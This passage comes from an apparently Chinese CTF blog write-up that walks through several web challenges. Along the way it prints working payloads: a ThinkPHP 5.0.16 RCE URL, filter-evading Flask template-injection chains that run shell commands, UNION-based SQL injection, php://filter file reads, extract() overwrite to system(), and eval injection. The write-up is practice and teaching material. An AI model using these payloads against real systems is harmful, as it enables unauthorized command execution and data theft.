class="line">burp0_cookies = &#123;<span class="string">&quot;csrftoken&quot;</span>: <span class="string">&quot;1pwr7Ukku6doV9tWxhM7LO3oFBxZqo2i4uavWkbAIGuw9YG6ETEg3rVzUG0IXmks&quot;</span>, <span class="string">&quot;nctf2018&quot;</span>: <span class="string">&quot;where+is+flag%3F&quot;</span>, <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;585crofngm37uggmrvk72dctt7&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://82.157.146.43:10685&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://82.157.146.43:10685/&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">resp = session.get(burp0_url)</span><br><span class="line">num = <span class="string">&quot;1111111111111111111111&quot;</span></span><br><span class="line">num_after_intval = <span class="string">&quot;9223372036854775807&quot;</span>	<span class="comment"># 利用php的intval函数对num进行处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	soup = BeautifulSoup(resp.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">	div_tags = soup.find_all(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;style&#x27;</span>: <span class="string">&#x27;display:inline;&#x27;</span>&#125;)</span><br><span class="line">	calc = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">if</span> div_tags:</span><br><span class="line">		<span class="keyword">for</span> div_tag <span class="keyword">in</span> div_tags:</span><br><span class="line">			calc += div_tag.text</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;未找到目标标签&quot;</span>)</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	<span class="comment"># 从每次返回的页面中提取计算公式，用eval对字符串进行运算</span></span><br><span class="line">	burp0_data = &#123;<span class="string">&quot;input&quot;</span>: num, <span class="string">&quot;ans&quot;</span>: <span class="built_in">eval</span>(num_after_intval+calc[:-<span class="number">1</span>])&#125;</span><br><span class="line">	<span class="built_in">print</span>(burp0_data)</span><br><span class="line">	resp = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">	<span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;tql&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">		<span class="built_in">print</span>(resp.text)</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><h3 id="摆就完事了1"><a href="#摆就完事了1" class="headerlink" title="摆就完事了1"></a>摆就完事了1</h3><p>目录扫描得到<a href="http://www.zip，解压后全局搜索flag，存在ffllaagg.php，但是并不是正确的flag。观察源码知道thinkphp的版本：5.0.16，存在RCE。（thinkphp/base.php）">www.zip，解压后全局搜索flag，存在ffllaagg.php，但是并不是正确的flag。观察源码知道thinkphp的版本：5.0.16，存在RCE。（thinkphp/base.php）</a></p>
+<p>构造payload获取根目录下的flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat$&#123;IFS&#125;/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011125719290.png" alt="image-20231011125719290"></p>
+<h3 id="Flask-Plus"><a href="#Flask-Plus" class="headerlink" title="Flask Plus"></a>Flask Plus</h3><p>点击网页上的各个按钮，点击右下角的小圆圈存在跳转，但是报错：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011140113420.png" alt="image-20231011140113420"></p>
+<p>观察可知，这是直接将URL贴在报错信息中，联想到Flask的模板注入。测试payload：49</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011141153913.png" alt="image-20231011141153913"></p>
+<p>经过测试，对一些常用payload的关键词存在检测，使用<strong>字符串拼接</strong>的办法进行绕过。</p>
+<p>获取所有子类：<code>&#123;&#123;''['__cl'+'ass__']['__ba'+'ses__'][0]['__subcl'+'asses__']()&#125;&#125;</code></p>
+<p>利用burp爆破找到可利用的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__ba&#x27;+&#x27;ses__&#x27;][0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[0][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;+&quot;pen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011153458941.png" alt="image-20231011153458941"></p>
+<p>改命令为cat读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27; &#x27;ass__&#x27;][&#x27;__ba&#x27; &#x27;ses__&#x27;][0][&#x27;__subcl&#x27; &#x27;asses__&#x27;]()[100][&#x27;__in&#x27; &#x27;it__&#x27;][&#x27;__glo&#x27; &#x27;bals__&#x27;][&#x27;__bui&#x27; &#x27;ltins__&#x27;][&#x27;ev&#x27; &#x27;al&#x27;](&quot;__im&quot; &quot;port__(&#x27;o&#x27; &#x27;s&#x27;).po&quot; &quot;pen(&#x27;cat /Th1s_is__F1114g&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011153857267.png" alt="image-20231011153857267"></p>
+<h3 id="滴-晨跑打卡"><a href="#滴-晨跑打卡" class="headerlink" title="滴!晨跑打卡"></a>滴!晨跑打卡</h3><p>尝试查询，根据返回结果可知存在sql注入：表名为pcnumber</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011155325508.png" alt="image-20231011155325508"></p>
+<p><strong>经测试存在空格过滤，用<code>%a0</code>代替空格；存在<code>#</code>过滤，无法使用注释符，构造单引号进行闭合。</strong></p>
+<p>确认回显位置：<code>id=0&#39;%a0union%a0select%a0&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011161430725.png" alt="image-20231011161430725"></p>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,database(),3,&#x27;</span><span class="number">4</span>	# 当前数据库：cgctf</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),3,&#x27;</span><span class="number">4</span>	# 查询所有数据库</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#x27;</span>cgctf<span class="string">&#x27;),3,&#x27;</span><span class="number">4</span>	# 查询cgctf的所有表：pcnumber</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#x27;</span>pcnumber<span class="string">&#x27;),3,&#x27;</span><span class="number">4</span>	# 查询pcnumber表的所有字段，存在flag列</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,(select%a0group_concat(flag)%a0from%a0pcnumber),3,&#x27;</span><span class="number">4</span>	# 查询flag列的所有值</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012125931315.png" alt="image-20231012125931315"></p>
+<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><h3 id="Easy-Audit"><a href="#Easy-Audit" class="headerlink" title="Easy Audit"></a>Easy Audit</h3><p>代码审计：</p>
+<ol>
+<li>对<code>$_REQUEST</code>参数值进行正则匹配，<code>/[a-zA-Z]/i</code>，不能有一个字母</li>
+<li>对<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>参数名+参数值进行正则匹配，<code>/yulige|flag|nctf/i</code>，不能有这三个关键词，但是后面读取flag需要这些参数</li>
+<li>参数内容需要满足：<ol>
+<li><code>substr($_GET[&#39;yulige&#39;], 32) === md5($_GET[&#39;yulige&#39;]</code></li>
+<li><code>file_get_contents($_GET[&#39;flag&#39;] === &#39;ccc_liubi&#39;</code></li>
+<li><code>preg_match(&#39;/nctfisfun$/&#39;, $_GET[&#39;nctf&#39;]) &amp;&amp; $_GET[&#39;nctf&#39;] !== &#39;nctfisfun&#39;</code></li>
+</ol>
+</li>
+</ol>
+<p>需求：绕过1和2的正则匹配，构造payload满足3中的要求</p>
+<ol>
+<li><code>$_REQUEST</code>绕过：同时存在GET和POST请求时且变量名相同时，<code>$_REQUEST</code>取到的是POST中的内容</li>
+<li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>绕过：<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>对请求内容不会进行URL解码，对过滤字符进行URL编码即可</li>
+<li>yulige参数：当参数为数组时substr和md5都会报错并返回null</li>
+<li>flag参数：使用data伪协议使file_get_contents的结果可控</li>
+<li>nctf参数：以nctfisfun结尾，在头部填充一点其他字符即可</li>
+</ol>
+<p>原始payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yulige[]=1&amp;flag=data://text/plain,ccc_liubi&amp;nctf=111nctfisfun</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012142617510.png" alt="image-20231012142617510"></p>
+<h3 id="calc"><a href="#calc" class="headerlink" title="*calc"></a>*calc</h3><p>根据场景和响应头中的<code>Server: Werkzeug/2.2.2 Python/3.8.10</code>联想到Flask模板注入。</p>
+<p>修改num参数使flask报错，得到源码：</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012153029276.png" alt="image-20231012153029276"></p>
+<p>eval函数处的注入有难以绕过的waf过滤，但是有一处system命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip = request.remote_addr</span><br><span class="line">log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip)</span><br><span class="line">os.system(log)</span><br></pre></td></tr></table></figure>
+
+<p>remote_addr不可伪造？</p>
+<h3 id="？？？？"><a href="#？？？？" class="headerlink" title="？？？？"></a>？？？？</h3><p>修改前端源码，去除提交按钮的disabled属性和输入框的长度限制。</p>
+<p>sh3ll.php：提示flag的文件名和过滤方式。</p>
+<p>利用nl命令，问号作为通配符，用于匹配单个字符，用16个问号代替fl4g_is_here.php</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012174354027.png" alt="image-20231012174354027"></p>
+<p>总结：nl命令，？通配符</p>
+<h3 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h3><p>页面提示需要flag参数，前端源码提示<code>secret_key</code>，所以与flask的config有关，尝试模板注入。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012222149094.png" alt="image-20231012222149094"></p>
+<h3 id="just-work-type"><a href="#just-work-type" class="headerlink" title="just-work-type"></a>just-work-type</h3><p>按照题目提示的用户名密码成功登录，进一步提示需要admin登录。</p>
+<p>解密token，猜测修改admin参数可以实现身份验证绕过。爆破得到jwt密钥：123</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012233626884.png" alt="image-20231012233626884"></p>
+<p>总结：jwt密钥爆破</p>
+<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><h3 id="simple-web-app"><a href="#simple-web-app" class="headerlink" title="simple web app"></a>simple web app</h3><p>正常注册登录后，发现查看个人页面时会发起&#x2F;graphql查询。</p>
+<p>修改请求体为以下内容，查看所有接口</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;\n    query IntrospectionQuery &#123;\n      __schema &#123;\n        \n        queryType &#123; name &#125;\n        mutationType &#123; name &#125;\n        subscriptionType &#123; name &#125;\n        types &#123;\n          ...FullType\n        &#125;\n        directives &#123;\n          name\n          description\n          \n          locations\n          args &#123;\n            ...InputValue\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n\n    fragment FullType on __Type &#123;\n      kind\n      name\n      description\n      \n      fields(includeDeprecated: true) &#123;\n        name\n        description\n        args &#123;\n          ...InputValue\n        &#125;\n        type &#123;\n          ...TypeRef\n        &#125;\n        isDeprecated\n        deprecationReason\n      &#125;\n      inputFields &#123;\n        ...InputValue\n      &#125;\n      interfaces &#123;\n        ...TypeRef\n      &#125;\n      enumValues(includeDeprecated: true) &#123;\n        name\n        description\n        isDeprecated\n        deprecationReason\n      &#125;\n      possibleTypes &#123;\n        ...TypeRef\n      &#125;\n    &#125;\n\n    fragment InputValue on __InputValue &#123;\n      name\n      description\n      type &#123; ...TypeRef &#125;\n      defaultValue\n      \n      \n    &#125;\n\n    fragment TypeRef on __Type &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n                ofType &#123;\n                  kind\n                  name\n                  ofType &#123;\n                    kind\n                    name\n                  &#125;\n                &#125;\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &quot;</span><span class="punctuation">,</span><span class="attr">&quot;variables&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;operationName&quot;</span><span class="punctuation">:</span><span class="string">&quot;IntrospectionQuery&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014174011309.png" alt="image-20231014174011309"></p>
+<p>利用工具将结果可视化：<a target="_blank" rel="noopener" href="https://github.com/2fd/graphdoc">https://github.com/2fd/graphdoc</a></p>
+<p>User对象中存在role字段，根据Role的内容猜测需要把用户角色改为ADMIN。存在addUser操作，可以控制role</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014173356110.png" alt="image-20231014173356110"></p>
+<p>构造&#x2F;graphql的请求体新建一个ADMIN用户，ADMIN登录后查看&#x2F;profile获得flag</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;mutation &#123;\n addUser(username:\&quot;aaa\&quot;,password:\&quot;bbb\&quot;,email:\&quot;ccc\&quot;,role:ADMIN)\n&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014173520220.png" alt="image-20231014173520220"></p>
+<p>总结：graphql语法</p>
+<h3 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h3><p>观察请求包，发现在登录之前有一个根路径的请求，提示：”Y0u 4re n0t admin, no fl4g h3re“，说明需要admin登录。响应头存在Set-Cookie，看起来是base64编码，解码得到：{“username”:”null”,”status”:0}</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014191932477.png" alt="image-20231014191932477"></p>
+<p>尝试构造cookie：{“username”:”admin”,”status”:1}（status需要猜一下）</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014192422272.png" alt="image-20231014192422272"></p>
+<h3 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h3><p>深信服EDR漏洞，原理参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/108077482">https://blog.csdn.net/qq_32393893/article/details/108077482</a></p>
+<p>后台扫描存在index.php.bak，得到index.php源码后进行审计：存在extract变量覆盖，GET传入strip_slashes参数可以直接覆盖源码中的strip_slashes变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:/?strip_slashes=system&amp;host=cat+/flag</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$host</span>  = <span class="keyword">isset</span>(<span class="variable">$host</span>)  ? <span class="variable">$strip_slashes</span>(<span class="variable">$host</span>)  : <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//$strip_slashes($host)==system(&quot;cat /flag&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014201151850.png" alt="image-20231014201151850"></p>
+<p>总结：extract变量覆盖</p>
+<h3 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame&#x27;</span>] !== <span class="string">&#x27;20201001&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^20201001$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame&#x27;</span>]))	<span class="comment">//使用%0a，也就是换行符，绕过单行的正则匹配</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] != <span class="number">1024</span> &amp;&amp; <span class="variable">$intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) === <span class="number">1024</span>)    <span class="comment">//用小数绕过</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014224934973.png" alt="image-20231014224934973"></p>
+<h3 id="wh1sper’s-secret-garden"><a href="#wh1sper’s-secret-garden" class="headerlink" title="wh1sper’s_secret_garden"></a>wh1sper’s_secret_garden</h3><ol>
+<li>你需要使用wh1sper浏览器来访问→抓包改浏览器为wh1sper</li>
+<li>你需要来自：<a target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/">https://ctf.njupt.edu.cn/</a> →添加&#x2F;改请求头Referer</li>
+<li>你得从本地访问才行哟！ → 添加请求头X-Forwarded-For</li>
+</ol>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014230533897.png" alt="image-20231014230533897"></p>
+<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>vim在编辑时会生成一个隐藏的临时文件，当vim非正常关闭时这个文件就会被保留下来。即.filename.swp。</p>
+<p>获取.index.php.swp，下载下来后变成了index.php.swp，在Linux中通过vim恢复源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim index.php	<span class="comment"># 新建一个index.php，不用写什么东西，与swp在同一文件夹</span></span><br><span class="line"><span class="built_in">mv</span> index.php.swp .index.php.swp</span><br><span class="line">vim -r index.php</span><br></pre></td></tr></table></figure>
+
+<p>源码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]?<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]?<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span> == <span class="string">&#x27;2&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$id</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|base64/&#x27;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>id弱类型绕过：如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。</strong>[CTF之PHP代码审计1_ctf php a<a target="_blank" rel="noopener" href="https://blog.csdn.net/bmth666/article/details/104769645">] &amp; b[]-CSDN博客</a></p>
+<p>file：伪协议，大小写绕过。postpayload：<code>id=2a&amp;file=php://filTer/convert.basE64-encode/resource=flag.php</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231015220753981.png" alt="image-20231015220753981"></p>
+<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><h3 id="bug1"><a href="#bug1" class="headerlink" title="*bug1"></a>*bug1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;N1k0la&#x27;</span>]))</span><br><span class="line">    <span class="variable">$secret_key</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;N1k0la&#x27;</span>], <span class="variable">$secret_key</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;Pupi1&#x27;</span>], <span class="variable">$secret_key</span>);</span><br></pre></td></tr></table></figure>
+
+<p>经过两次hash_hmac哈希，当$_POST[‘N1k0la’]为数组时secret_key被重置为null，因此payload可控。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>](<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;Pupi1&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>用户自定义函数？</p>
+<h3 id="bug2"><a href="#bug2" class="headerlink" title="bug2"></a>bug2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="string">&#x27;Welcome &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>$str</code>是POST参数经过处理后的结果，经尝试过滤了<code>$^[]&#39;&quot;</code>和反引号，没有过滤分号，可以<strong>闭合echo</strong>这行代码，执行多条语句。</p>
+<p>查看phpinfo：<code>N1k0la=;phpinfo()</code>，disable_functions内容为空，但是经测试还是过滤了很多危险函数。</p>
+<p>查看当前目录下的文件：<code>N1k0la=;var_dump(scandir(getcwd()))</code>，存在fllllll4444444g.php</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017184335557.png" alt="image-20231017184335557"></p>
+<p>利用show_source来读取文件，由于单引号被过滤，因此将文件名字符串转为ASCII：<code>N1k0la=1;show_source(chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(103).chr(46).chr(112).chr(104).chr(112))</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017184733809.png" alt="image-20231017184733809"></p>
+<h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><p>ping按钮被设置了disabled属性，F12删除这个属性即可。</p>
+<p>rce fuzz测试：%0a换行绕过。<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master/rcePayloads%EF%BC%88%E7%9C%8B%E6%9D%A5%E6%98%AF%E7%9B%B4%E6%8E%A5%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E4%BA%86%EF%BC%89">https://github.com/TheKingOfDuck/fuzzDicts/tree/master/rcePayloads（看来是直接命令拼接了）</a></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017211728892.png" alt="image-20231017211728892"></p>
+<h3 id="diao图管理器（已跑路"><a href="#diao图管理器（已跑路" class="headerlink" title="*diao图管理器（已跑路"></a>*diao图管理器（已跑路</h3><p>前端源码提示： 上传图片均被base64处理，处理后的文件名为xxx，xxx为三位随机数 。因此需要爆破文件名。</p>
+<p>dirb后台扫描扫到：</p>
+<ul>
+<li>&#x2F;admin，猜测需要登录</li>
+<li>&#x2F;download，提示just input something plz，不能处理POST请求，猜测需要GET参数</li>
+</ul>
+<p>此题重点不在文件上传，而是要下载这上面存的图片，就是不知道参数咋猜的。</p>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>前端源码提示：read.php?filename&#x3D;，可能存在文件包含</p>
+<p>利用php伪协议读取index.php源码：<code>/read.php?filename=php://filter/convert.base64-encode/resource=index.php</code>，对文件后缀和文件内容进行过滤，ph相关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span 